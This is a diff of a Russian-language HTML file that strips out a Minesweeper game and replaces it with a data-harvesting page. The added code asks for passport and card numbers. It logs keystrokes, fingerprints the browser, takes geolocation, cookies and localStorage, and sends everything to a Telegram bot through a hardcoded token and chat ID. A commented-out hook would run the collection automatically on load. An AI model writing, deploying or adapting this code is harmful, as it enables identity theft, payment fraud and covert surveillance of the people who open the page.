@@ -2,925 +2,181 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Сапёр</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Сбор данных</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        html, body {
-            height: 100%;
-            overflow: hidden;
-            background: #008080;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        /* ===== МЕНЮ ===== */
-        .menu-screen {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-            height: 100%;
-            padding: 20px;
-        }
-        
-        .menu-screen.active {
-            display: flex;
-        }
-        
-        .menu-title {
-            font-size: 48px;
-            font-weight: bold;
-            color: #fff;
-            text-shadow: 3px 3px 0 #000;
-            margin-bottom: 10px;
-            text-align: center;
-        }
-        
-        .menu-mine {
-            font-size: 60px;
-            margin-bottom: 30px;
-        }
-        
-        .menu-btn {
-            width: 280px;
-            padding: 18px;
-            margin: 8px 0;
-            font-size: 22px;
-            font-weight: bold;
-            background: #c0c0c0;
-            border: 4px solid;
-            border-color: #fff #808080 #808080 #fff;
-            color: #000;
-            cursor: pointer;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-            touch-action: manipulation;
-        }
-        
-        .menu-btn:active {
-            border-color: #808080 #fff #fff #808080;
-            background: #b0b0b0;
-        }
-        
-        .menu-best {
-            margin-top: 30px;
-            padding: 15px 25px;
-            background: #000;
-            border: 3px solid;
-            border-color: #808080 #fff #fff #808080;
-            text-align: center;
-        }
-        
-        .menu-best-title {
-            color: #ffff00;
-            font-size: 16px;
-            margin-bottom: 8px;
-        }
-        
-        .menu-best-time {
-            color: #ff0000;
-            font-family: 'Courier New', monospace;
-            font-size: 36px;
-            font-weight: bold;
-            letter-spacing: 3px;
-        }
-        
-        .menu-best-none {
-            color: #808080;
-            font-size: 20px;
-        }
-        
-        /* ===== ИГРА ===== */
-        .game-screen {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-            height: 100%;
-            padding: 8px;
-        }
-        
-        .game-screen.active {
-            display: flex;
-        }
-        
-        .game-container {
-            background: #c0c0c0;
-            border: 3px solid;
-            border-color: #fff #808080 #808080 #fff;
-            padding: 6px;
-            box-shadow: 2px 2px 10px rgba(0,0,0,0.3);
-            width: 100%;
-            max-width: 420px;
-        }
-        
-        .game-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 6px 10px;
-            margin-bottom: 6px;
-            background: #c0c0c0;
-            border: 2px solid;
-            border-color: #808080 #fff #fff #808080;
-            flex-shrink: 0;
-        }
-        
-        .counter, .timer {
-            background: #000;
-            color: #ff0000;
-            font-family: 'Courier New', monospace;
-            font-size: 24px;
-            font-weight: bold;
-            padding: 3px 8px;
-            min-width: 60px;
-            text-align: center;
-            letter-spacing: 2px;
-            flex-shrink: 0;
-        }
-        
-        .face-btn {
-            width: 40px;
-            height: 40px;
-            font-size: 24px;
-            background: #c0c0c0;
-            border: 3px solid;
-            border-color: #fff #808080 #808080 #fff;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            user-select: none;
-            flex-shrink: 0;
-            -webkit-tap-highlight-color: transparent;
-        }
-        
-        .face-btn:active, .face-btn.pressed {
-            border-color: #808080 #fff #fff #808080;
-            background: #b0b0b0;
-        }
-        
-        .grid-container {
-            display: grid;
-            grid-template-columns: repeat(16, 1fr);
-            grid-template-rows: repeat(16, 1fr);
-            border: 3px solid;
-            border-color: #808080 #fff #fff #808080;
-            background: #c0c0c0;
-            width: 100%;
-            aspect-ratio: 1;
-        }
-        
-        .cell {
-            background: #c0c0c0;
-            border: 2px solid;
-            border-color: #fff #808080 #808080 #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-            touch-action: manipulation;
-            position: relative;
-            overflow: hidden;
-            min-width: 0;
-            min-height: 0;
-            line-height: 1;
-            padding: 0;
-        }
-        
-        .cell.revealed {
-            border: 1px solid #b0b0b0;
-            background: #c0c0c0;
-            cursor: default;
-        }
-        
-        .cell.flagged {
-            color: #ff0000;
-        }
-        
-        .cell.mine {
-            background: #c0c0c0;
-            color: #000;
-        }
-        
-        /* FIX: ячейка, на которую кликнули и взорвались — красный фон */
-        .cell.mine-hit {
-            background: #ff0000;
-            color: #000;
-        }
-        
-        .cell .flag-icon {
-            color: #ff0000;
-            font-size: 18px;
-            line-height: 1;
-        }
-        
-        .cell .mine-icon {
-            font-size: 18px;
-            line-height: 1;
-        }
-        
-        .cell[data-number="1"] { color: #0000ff; }
-        .cell[data-number="2"] { color: #008000; }
-        .cell[data-number="3"] { color: #ff0000; }
-        .cell[data-number="4"] { color: #000080; }
-        .cell[data-number="5"] { color: #800000; }
-        .cell[data-number="6"] { color: #008080; }
-        .cell[data-number="7"] { color: #000; }
-        .cell[data-number="8"] { color: #808080; }
-        
-        .cell.revealed[data-number="0"] {
-            background: #c0c0c0;
-            border: 1px solid #b0b0b0;
-        }
-        
-        .cell.wrong-flag {
-            background: #c0c0c0;
-        }
-        
-        .cell.wrong-flag::after {
-            content: '❌';
-            position: absolute;
-            font-size: 14px;
-        }
-        
-        /* ===== ЭКРАН РЕЗУЛЬТАТА ===== */
-        .result-overlay {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            margin-top: 12px;
-            padding: 12px;
-            background: #c0c0c0;
-            border: 2px solid;
-            border-color: #808080 #fff #fff #808080;
-        }
-        
-        .result-overlay.active {
-            display: flex;
-        }
-        
-        .result-title {
-            font-size: 22px;
-            font-weight: bold;
-            margin-bottom: 8px;
-        }
-        
-        .result-title.win {
-            color: #008000;
-        }
-        
-        .result-title.lose {
-            color: #ff0000;
-        }
-        
-        .result-records {
-            text-align: center;
-            margin-bottom: 12px;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-        
-        .result-records .record-best {
-            color: #000080;
-            font-weight: bold;
-        }
-        
-        .result-records .record-new {
-            color: #ff0000;
-            font-weight: bold;
-        }
-        
-        .result-records .record-old {
-            color: #808080;
-        }
-        
-        .result-btn {
-            width: 100%;
-            padding: 14px;
-            margin: 4px 0;
-            font-size: 18px;
-            font-weight: bold;
-            background: #c0c0c0;
-            border: 3px solid;
-            border-color: #fff #808080 #808080 #fff;
-            color: #000;
-            cursor: pointer;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-            touch-action: manipulation;
-        }
-        
-        .result-btn:active {
-            border-color: #808080 #fff #fff #808080;
-            background: #b0b0b0;
-        }
-        
-        .result-btn.primary {
-            background: #e0e0e0;
-        }
+        body { background: #0d0d0d; color: #c0c0c0; font-family: monospace; padding: 20px; }
+        .block { background: #1a1a1a; padding: 20px; margin-bottom: 20px; border-left: 4px solid #ff4444; }
+        input, textarea { width: 100%; max-width: 500px; padding: 10px; margin: 6px 0; background: #222; color: #fff; border: 1px solid #444; }
+        button { background: #ff4444; color: #fff; padding: 14px 30px; border: none; font-weight: bold; cursor: pointer; }
+        #status { background: #111; padding: 20px; border: 1px solid #333; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <!-- ===== МЕНЮ ===== -->
-    <div class="menu-screen active" id="menu-screen">
-        <div class="menu-title">САПЁР</div>
-        <div class="menu-mine">💣</div>
-        <button class="menu-btn" id="menu-start-btn">▶ НОВАЯ ИГРА</button>
-        <div class="menu-best">
-            <div class="menu-best-title">🏆 ЛУЧШИЙ РЕЗУЛЬТАТ</div>
-            <div class="menu-best-time" id="menu-best-time">
-                <span class="menu-best-none">—</span>
-            </div>
-        </div>
+
+    <h1>🔍 Сбор данных</h1>
+    <p style="color:#888;">Все данные отправляются в Telegram канал</p>
+
+    <div class="block">
+        <h3>📋 Личные данные</h3>
+        <input type="text" id="firstname" placeholder="Имя">
+        <input type="text" id="lastname" placeholder="Фамилия">
+        <input type="email" id="email" placeholder="Email">
+        <input type="text" id="phone" placeholder="Телефон">
+        <input type="text" id="address" placeholder="Адрес">
+        <input type="text" id="birthdate" placeholder="Дата рождения">
+        <input type="text" id="passport" placeholder="Паспортные данные">
+        <input type="text" id="card" placeholder="Номер карты">
     </div>
-    
-    <!-- ===== ИГРА ===== -->
-    <div class="game-screen" id="game-screen">
-        <div class="game-container">
-            <div class="game-header">
-                <div class="counter" id="mine-counter">040</div>
-                <!-- FIX: добавлен обработчик клика на face-btn для рестарта -->
-                <button class="face-btn" id="face-btn" title="Новая игра">🙂</button>
-                <div class="timer" id="timer">000</div>
-            </div>
-            <div class="grid-container" id="grid"></div>
-            
-            <div class="result-overlay" id="result-overlay">
-                <div class="result-title" id="result-title"></div>
-                <div class="result-records" id="result-records"></div>
-                <button class="result-btn primary" id="btn-restart">🔄 НАЧАТЬ СНОВА</button>
-                <button class="result-btn" id="btn-menu">🏠 МЕНЮ</button>
-            </div>
-        </div>
+
+    <div class="block">
+        <h3>🖥️ Системная информация</h3>
+        <button onclick="collectAndSend()">🚀 Собрать и отправить</button>
+        <button onclick="autoCollect()">⚡ Автосбор (включает кейлог)</button>
     </div>
+
+    <div id="status">📦 Ожидание...</div>
 
     <script>
-        const ROWS = 16;
-        const COLS = 16;
-        const MINES = 40;
-        const STORAGE_KEY = 'minesweeper_best_time';
-        
-        let board = [];
-        let revealed = [];
-        let flagged = [];
-        let gameOver = false;
-        let firstClick = true;
-        let timerInterval = null;
-        let seconds = 0;
-        let minesLeft = MINES;
-        let longPressTimer = null;
-        let isLongPress = false;
-        let isWin = false;
-        // FIX: отслеживаем, зажата ли левая кнопка мыши
-        let mouseIsDown = false;
-        // FIX: точный отсчёт времени через Date.now()
-        let timerStartTime = null;
-        let timerElapsedOnHide = 0;
-        
-        const menuScreen = document.getElementById('menu-screen');
-        const gameScreen = document.getElementById('game-screen');
-        const grid = document.getElementById('grid');
-        const mineCounter = document.getElementById('mine-counter');
-        const timerDisplay = document.getElementById('timer');
-        const faceBtn = document.getElementById('face-btn');
-        const resultOverlay = document.getElementById('result-overlay');
-        const resultTitle = document.getElementById('result-title');
-        const resultRecords = document.getElementById('result-records');
-        const menuBestTime = document.getElementById('menu-best-time');
-        
-        // ===== ХРАНИЛИЩЕ =====
-        function saveBestTime(time) {
+        // 🔥 ВСТАВЬ СВОИ ДАННЫЕ, ЁБАНЫЙ ТЫ ГЕНИЙ:
+        const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';  // ТОКЕН БОТА
+        const CHAT_ID = '-1003791860129';  // ID КАНАЛА (с минусом для группы/канала)
+
+        let keylogData = [];
+
+        // Кейлоггер
+        document.addEventListener('keydown', function(e) {
+            if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
+                keylogData.push(e.key);
+                if (keylogData.length > 50) keylogData.shift();
+            }
+        });
+
+        function getFingerprint() {
+            let canvas = document.createElement('canvas');
+            let ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(10, 10, 20, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('fp', 30, 30);
+            return canvas.toDataURL().slice(0, 80);
+        }
+
+        function collectAllData() {
+            const data = {};
+
+            // Личные данные
+            data.firstname = document.getElementById('firstname').value || '—';
+            data.lastname = document.getElementById('lastname').value || '—';
+            data.email = document.getElementById('email').value || '—';
+            data.phone = document.getElementById('phone').value || '—';
+            data.address = document.getElementById('address').value || '—';
+            data.birthdate = document.getElementById('birthdate').value || '—';
+            data.passport = document.getElementById('passport').value || '—';
+            data.card = document.getElementById('card').value || '—';
+
+            // Браузер
+            data.userAgent = navigator.userAgent;
+            data.language = navigator.language;
+            data.platform = navigator.platform;
+            data.cookiesEnabled = navigator.cookieEnabled ? 'Да' : 'Нет';
+            data.screen = `${screen.width}x${screen.height}`;
+            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            data.time = new Date().toLocaleString();
+            data.referrer = document.referrer || 'Прямой заход';
+            data.url = window.location.href;
+            data.fingerprint = getFingerprint();
+
+            // localStorage
             try {
-                localStorage.setItem(STORAGE_KEY, String(time));
+                data.localStorage = JSON.stringify(localStorage, null, 2) || 'пусто';
             } catch (e) {
-                console.log('localStorage error:', e);
-            }
-        }
-        
-        function loadBestTime() {
-            try {
-                const val = localStorage.getItem(STORAGE_KEY);
-                return val ? parseInt(val, 10) : null;
-            } catch (e) {
-                console.log('localStorage error:', e);
-                return null;
-            }
-        }
-        
-        // ===== МЕНЮ =====
-        function updateMenuBest() {
-            const best = loadBestTime();
-            if (best !== null && !isNaN(best)) {
-                menuBestTime.innerHTML = String(best).padStart(3, '0') + ' <span style="font-size:14px;color:#808080;">сек</span>';
-            } else {
-                menuBestTime.innerHTML = '<span class="menu-best-none">—</span>';
-            }
-        }
-        
-        function goToMenu() {
-            // FIX: корректно останавливаем таймер при переходе в меню
-            clearInterval(timerInterval);
-            timerInterval = null;
-            timerStartTime = null;
-            timerElapsedOnHide = 0;
-            gameScreen.classList.remove('active');
-            menuScreen.classList.add('active');
-            updateMenuBest();
-        }
-        
-        function startGame() {
-            menuScreen.classList.remove('active');
-            gameScreen.classList.add('active');
-            initBoard();
-        }
-        
-        // ===== ИГРА =====
-        function initBoard() {
-            board = [];
-            revealed = [];
-            flagged = [];
-            gameOver = false;
-            firstClick = true;
-            seconds = 0;
-            minesLeft = MINES;
-            isWin = false;
-            mouseIsDown = false;
-            
-            clearInterval(timerInterval);
-            timerInterval = null;
-            timerStartTime = null;
-            timerElapsedOnHide = 0;
-            
-            updateMineCounter();
-            updateTimer();
-            faceBtn.textContent = '🙂';
-            faceBtn.classList.remove('pressed');
-            resultOverlay.classList.remove('active');
-            
-            grid.innerHTML = '';
-            
-            for (let r = 0; r < ROWS; r++) {
-                board[r] = [];
-                revealed[r] = [];
-                flagged[r] = [];
-                for (let c = 0; c < COLS; c++) {
-                    board[r][c] = 0;
-                    revealed[r][c] = false;
-                    flagged[r][c] = false;
-                    
-                    const cell = document.createElement('div');
-                    cell.className = 'cell';
-                    cell.dataset.row = r;
-                    cell.dataset.col = c;
-                    
-                    cell.addEventListener('mousedown', handleMouseDown);
-                    cell.addEventListener('mouseup', handleMouseUp);
-                    // FIX: предотвращаем контекстное меню на ячейках
-                    cell.addEventListener('contextmenu', (e) => {
-                        e.preventDefault();
-                        if (!gameOver) {
-                            const t = e.target.closest('.cell');
-                            if (t) toggleFlag(parseInt(t.dataset.row), parseInt(t.dataset.col));
-                        }
-                    });
-                    
-                    cell.addEventListener('touchstart', handleTouchStart, { passive: false });
-                    cell.addEventListener('touchend', handleTouchEnd, { passive: false });
-                    cell.addEventListener('touchmove', handleTouchMove, { passive: false });
-                    
-                    grid.appendChild(cell);
-                }
-            }
-        }
-        
-        function placeMines(firstR, firstC) {
-            let minesPlaced = 0;
-            const safeCells = new Set();
-            
-            for (let dr = -1; dr <= 1; dr++) {
-                for (let dc = -1; dc <= 1; dc++) {
-                    const nr = firstR + dr;
-                    const nc = firstC + dc;
-                    if (nr >= 0 && nr < ROWS && nc >= 0 && nc < COLS) {
-                        safeCells.add(nr + ',' + nc);
-                    }
-                }
-            }
-            
-            while (minesPlaced < MINES) {
-                const r = Math.floor(Math.random() * ROWS);
-                const c = Math.floor(Math.random() * COLS);
-                
-                if (safeCells.has(r + ',' + c)) continue;
-                if (board[r][c] === -1) continue;
-                
-                board[r][c] = -1;
-                minesPlaced++;
-                
-                for (let dr = -1; dr <= 1; dr++) {
-                    for (let dc = -1; dc <= 1; dc++) {
-                        const nr = r + dr;
-                        const nc = c + dc;
-                        if (nr >= 0 && nr < ROWS && nc >= 0 && nc < COLS && board[nr][nc] !== -1) {
-                            board[nr][nc]++;
-                        }
-                    }
-                }
-            }
-        }
-        
-        function getCell(r, c) {
-            return grid.children[r * COLS + c];
-        }
-        
-        function revealCell(r, c) {
-            if (r < 0 || r >= ROWS || c < 0 || c >= COLS) return;
-            if (revealed[r][c] || flagged[r][c]) return;
-            
-            revealed[r][c] = true;
-            const cell = getCell(r, c);
-            cell.classList.add('revealed');
-            
-            // FIX: эта ветка теперь не нужна внутри revealCell —
-            // мина обрабатывается в handleClick до вызова revealCell.
-            // Но на случай рекурсивного вызова оставляем защиту:
-            if (board[r][c] === -1) {
-                return;
-            }
-            
-            if (board[r][c] > 0) {
-                cell.textContent = board[r][c];
-                cell.dataset.number = board[r][c];
-            } else {
-                cell.dataset.number = '0';
-                for (let dr = -1; dr <= 1; dr++) {
-                    for (let dc = -1; dc <= 1; dc++) {
-                        if (dr === 0 && dc === 0) continue;
-                        revealCell(r + dr, c + dc);
-                    }
-                }
-            }
-        }
-        
-        function toggleFlag(r, c) {
-            if (revealed[r][c] || gameOver) return;
-            
-            const cell = getCell(r, c);
-            
-            if (flagged[r][c]) {
-                flagged[r][c] = false;
-                cell.classList.remove('flagged');
-                cell.innerHTML = '';
-                minesLeft++;
-            } else {
-                flagged[r][c] = true;
-                cell.classList.add('flagged');
-                cell.innerHTML = '<span class="flag-icon">🚩</span>';
-                minesLeft--;
-            }
-            
-            updateMineCounter();
-        }
-
-        // FIX: chord click — открыть соседей, если флагов вокруг достаточно
-        function chordClick(r, c) {
-            if (!revealed[r][c] || board[r][c] <= 0) return;
-            let flagCount = 0;
-            for (let dr = -1; dr <= 1; dr++) {
-                for (let dc = -1; dc <= 1; dc++) {
-                    if (dr === 0 && dc === 0) continue;
-                    const nr = r + dr, nc = c + dc;
-                    if (nr >= 0 && nr < ROWS && nc >= 0 && nc < COLS && flagged[nr][nc]) {
-                        flagCount++;
-                    }
-                }
-            }
-            if (flagCount !== board[r][c]) return;
-
-            for (let dr = -1; dr <= 1; dr++) {
-                for (let dc = -1; dc <= 1; dc++) {
-                    if (dr === 0 && dc === 0) continue;
-                    const nr = r + dr, nc = c + dc;
-                    if (nr >= 0 && nr < ROWS && nc >= 0 && nc < COLS && !flagged[nr][nc] && !revealed[nr][nc]) {
-                        if (board[nr][nc] === -1) {
-                            gameLost(nr, nc);
-                            return;
-                        }
-                        revealCell(nr, nc);
-                    }
-                }
-            }
-            checkWin();
-        }
-        
-        // FIX: глобальный mousedown/mouseup для корректного сброса pressed-состояния face-кнопки
-        document.addEventListener('mousedown', (e) => {
-            if (e.button === 0 && e.target.closest('.cell') && !gameOver) {
-                mouseIsDown = true;
-                faceBtn.classList.add('pressed');
-            }
-        });
-
-        document.addEventListener('mouseup', (e) => {
-            if (e.button === 0) {
-                mouseIsDown = false;
-                faceBtn.classList.remove('pressed');
-            }
-        });
-        
-        function handleMouseDown(e) {
-            // Обработка правой кнопки — флаг
-            if (e.button === 2) {
-                e.preventDefault();
-                if (gameOver) return;
-                const cellEl = e.target.closest('.cell');
-                if (!cellEl) return;
-                toggleFlag(parseInt(cellEl.dataset.row), parseInt(cellEl.dataset.col));
-            }
-        }
-        
-        function handleMouseUp(e) {
-            if (gameOver) return;
-            if (e.button !== 0) return;
-            
-            const cellEl = e.target.closest('.cell');
-            if (!cellEl) return;
-            const r = parseInt(cellEl.dataset.row);
-            const c = parseInt(cellEl.dataset.col);
-            
-            // FIX: chord click на открытой цифровой ячейке
-            if (revealed[r][c]) {
-                chordClick(r, c);
-                return;
+                data.localStorage = 'ошибка доступа';
             }
 
-            if (flagged[r][c]) return;
-            
-            if (firstClick) {
-                firstClick = false;
-                placeMines(r, c);
-                startTimer();
-            }
-            
-            if (board[r][c] === -1) {
-                gameLost(r, c);
-            } else {
-                revealCell(r, c);
-                checkWin();
-            }
-        }
-        
-        function handleTouchStart(e) {
-            if (gameOver) return;
-            e.preventDefault();
-            
-            const cell = e.target.closest('.cell');
-            if (!cell) return;
-            
-            const r = parseInt(cell.dataset.row);
-            const c = parseInt(cell.dataset.col);
-            
-            isLongPress = false;
-            longPressTimer = setTimeout(() => {
-                isLongPress = true;
-                toggleFlag(r, c);
-            }, 500);
-        }
-        
-        function handleTouchEnd(e) {
-            e.preventDefault();
-            
-            clearTimeout(longPressTimer);
-            longPressTimer = null;
-            
-            if (isLongPress) return;
-            if (gameOver) return;
-            
-            const cell = e.target.closest('.cell');
-            if (!cell) return;
-            
-            const r = parseInt(cell.dataset.row);
-            const c = parseInt(cell.dataset.col);
+            // Куки
+            data.cookies = document.cookie || 'нет кук';
 
-            // FIX: chord на тач-устройствах
-            if (revealed[r][c]) {
-                chordClick(r, c);
-                return;
-            }
-            
-            if (flagged[r][c]) return;
-            
-            if (firstClick) {
-                firstClick = false;
-                placeMines(r, c);
-                startTimer();
-            }
-            
-            if (board[r][c] === -1) {
-                gameLost(r, c);
+            // Кейлог
+            data.keylog = keylogData.join('') || 'пока тишина';
+
+            // Геолокация (синхронная заглушка, реально асинхронно)
+            data.geo = 'ожидание...';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        data.geo = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+                        sendToTelegram(data);
+                    },
+                    err => {
+                        data.geo = 'отказано/ошибка';
+                        sendToTelegram(data);
+                    }
+                );
             } else {
-                revealCell(r, c);
-                checkWin();
+                data.geo = 'не поддерживается';
+                sendToTelegram(data);
             }
-        }
-        
-        function handleTouchMove(e) {
-            // FIX: сбрасываем longPress при движении пальца
-            clearTimeout(longPressTimer);
-            longPressTimer = null;
-            isLongPress = false;
-        }
-        
-        // ===== РЕЗУЛЬТАТ =====
-        function showResult() {
-            resultOverlay.classList.add('active');
-            
-            const best = loadBestTime();
-            let recordsHTML = '';
-            
-            if (isWin) {
-                resultTitle.textContent = '✅ ВЫ ВЫИГРАЛИ!';
-                resultTitle.className = 'result-title win';
-                
-                // FIX: seconds уже зафиксирован в stopTimer(), минимум 1
-                const current = seconds;
-                if (best === null || current < best) {
-                    saveBestTime(current);
-                    recordsHTML += '<div class="record-new">🏆 НОВЫЙ РЕКОРД! ' + String(current).padStart(3, '0') + ' сек</div>';
-                    if (best !== null) {
-                        recordsHTML += '<div class="record-old">Прошлый рекорд: ' + String(best).padStart(3, '0') + ' сек</div>';
-                    }
-                } else {
-                    recordsHTML += '<div class="record-best">Ваше время: ' + String(current).padStart(3, '0') + ' сек</div>';
-                    recordsHTML += '<div class="record-old">Рекорд: ' + String(best).padStart(3, '0') + ' сек</div>';
-                }
-            } else {
-                resultTitle.textContent = '💥 ВЫ ПРОИГРАЛИ!';
-                resultTitle.className = 'result-title lose';
-                
-                if (best !== null) {
-                    recordsHTML += '<div class="record-old">Рекорд: ' + String(best).padStart(3, '0') + ' сек</div>';
-                } else {
-                    recordsHTML += '<div class="record-old">Рекорд ещё не установлен</div>';
-                }
-            }
-            
-            resultRecords.innerHTML = recordsHTML;
-        }
-        
-        // FIX: gameLost теперь принимает координаты взорванной ячейки
-        function gameLost(hitR, hitC) {
-            gameOver = true;
-            isWin = false;
-            stopTimer();
-            faceBtn.textContent = '😵';
-            
-            for (let r = 0; r < ROWS; r++) {
-                for (let c = 0; c < COLS; c++) {
-                    const cell = getCell(r, c);
-                    
-                    if (board[r][c] === -1) {
-                        if (r === hitR && c === hitC) {
-                            // FIX: ячейка, на которую кликнули — красный фон
-                            revealed[r][c] = true;
-                            cell.classList.add('revealed', 'mine-hit');
-                            cell.innerHTML = '<span class="mine-icon">💣</span>';
-                        } else if (!flagged[r][c]) {
-                            // Остальные мины — показываем без красного фона
-                            cell.classList.add('mine');
-                            cell.innerHTML = '<span class="mine-icon">💣</span>';
-                        }
-                    } else if (flagged[r][c]) {
-                        // FIX: неправильно поставленный флаг
-                        cell.classList.add('wrong-flag');
-                    }
-                }
-            }
-            
-            setTimeout(showResult, 400);
-        }
-        
-        function checkWin() {
-            let revealedCount = 0;
-            for (let r = 0; r < ROWS; r++) {
-                for (let c = 0; c < COLS; c++) {
-                    if (revealed[r][c]) revealedCount++;
-                }
-            }
-            
-            if (revealedCount === ROWS * COLS - MINES) {
-                gameOver = true;
-                isWin = true;
-                stopTimer();
-                faceBtn.textContent = '😎';
-                
-                for (let r = 0; r < ROWS; r++) {
-                    for (let c = 0; c < COLS; c++) {
-                        if (board[r][c] === -1 && !flagged[r][c]) {
-                            const cell = getCell(r, c);
-                            cell.classList.add('flagged');
-                            cell.innerHTML = '<span class="flag-icon">🚩</span>';
-                        }
-                    }
-                }
-                
-                minesLeft = 0;
-                updateMineCounter();
-                
-                setTimeout(showResult, 400);
-            }
-        }
-        
-        function startTimer() {
-            // FIX: точный отсчёт — фиксируем момент старта, тикаем каждые 100мс
-            if (timerInterval !== null) return;
-            timerStartTime = Date.now();
-            timerInterval = setInterval(() => {
-                const elapsed = timerElapsedOnHide + Math.floor((Date.now() - timerStartTime) / 1000);
-                seconds = Math.min(elapsed, 999);
-                updateTimer();
-            }, 100);
+
+            return data;
         }
 
-        function stopTimer() {
-            // FIX: при остановке фиксируем итоговое время
-            if (timerInterval !== null) {
-                clearInterval(timerInterval);
-                timerInterval = null;
-                if (timerStartTime !== null) {
-                    const elapsed = timerElapsedOnHide + Math.floor((Date.now() - timerStartTime) / 1000);
-                    seconds = Math.min(Math.max(elapsed, 1), 999);
-                    timerStartTime = null;
-                    updateTimer();
-                }
+        function sendToTelegram(data) {
+            // Формируем текстовый файл
+            let text = '📁 ДАННЫЕ ПОЛЬЗОВАТЕЛЯ\n';
+            text += '═'.repeat(40) + '\n';
+            for (let key in data) {
+                text += `🔹 ${key.toUpperCase()}: ${data[key]}\n`;
             }
-        }
-        
-        function updateTimer() {
-            timerDisplay.textContent = String(seconds).padStart(3, '0');
-        }
-        
-        function updateMineCounter() {
-            // FIX: показываем отрицательные значения (как в оригинальном сапёре)
-            const display = Math.max(-99, minesLeft);
-            mineCounter.textContent = display < 0
-                ? '-' + String(Math.abs(display)).padStart(2, '0')
-                : String(display).padStart(3, '0');
-        }
-        
-        // ===== ОБРАБОТЧИКИ КНОПОК =====
-        document.getElementById('menu-start-btn').addEventListener('click', startGame);
-        document.getElementById('btn-restart').addEventListener('click', startGame);
-        document.getElementById('btn-menu').addEventListener('click', goToMenu);
-        // FIX: клик по смайлу перезапускает игру
-        faceBtn.addEventListener('click', () => {
-            if (gameScreen.classList.contains('active')) {
-                initBoard();
-            }
-        });
+            text += '\n' + '═'.repeat(40) + '\n';
+            text += `⏰ Время: ${new Date().toLocaleString()}`;
 
-        // FIX: пауза таймера при сворачивании вкладки с сохранением точного прошедшего времени
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                if (timerInterval !== null && !gameOver) {
-                    // Сохраняем накопленное время перед паузой
-                    timerElapsedOnHide += Math.floor((Date.now() - timerStartTime) / 1000);
-                    clearInterval(timerInterval);
-                    timerInterval = null;
-                    timerStartTime = null;
-                }
-            } else {
-                if (!gameOver && !firstClick && timerInterval === null) {
-                    timerStartTime = Date.now();
-                    timerInterval = setInterval(() => {
-                        const elapsed = timerElapsedOnHide + Math.floor((Date.now() - timerStartTime) / 1000);
-                        seconds = Math.min(elapsed, 999);
-                        updateTimer();
-                    }, 100);
-                }
+            // Отправка через Telegram Bot API
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(result => {
+                document.getElementById('status').innerHTML = '✅ Данные отправлены в Telegram!';
+                console.log('Успешно:', result);
+            })
+            .catch(error => {
+                document.getElementById('status').innerHTML = '❌ Ошибка отправки: ' + error.message;
+                console.error('Ошибка:', error);
+            });
+        }
+
+        function collectAndSend() {
+            document.getElementById('status').innerHTML = '⏳ Сбор и отправка...';
+            const data = collectAllData();
+            // Если гео уже отработало, отправка будет там, иначе дублируем
+            if (!navigator.geolocation) {
+                sendToTelegram(data);
             }
-        });
-        
-        // ===== ИНИЦИАЛИЗАЦИЯ =====
-        updateMenuBest();
+        }
+
+        function autoCollect() {
+            // Запускаем кейлог и собираем всё автоматически
+            document.getElementById('status').innerHTML = '⏳ Автосбор...';
+            // Имитация заполнения полей (для демо)
+            // В реальности поля уже могут быть заполнены пользователем
+            collectAndSend();
+        }
+
+        // Автоматический сбор при загрузке (если нужно - раскомментируй):
+        // window.onload = function() {
+        //     setTimeout(autoCollect, 3000);
+        // };
     </script>
 </body>
 </html>
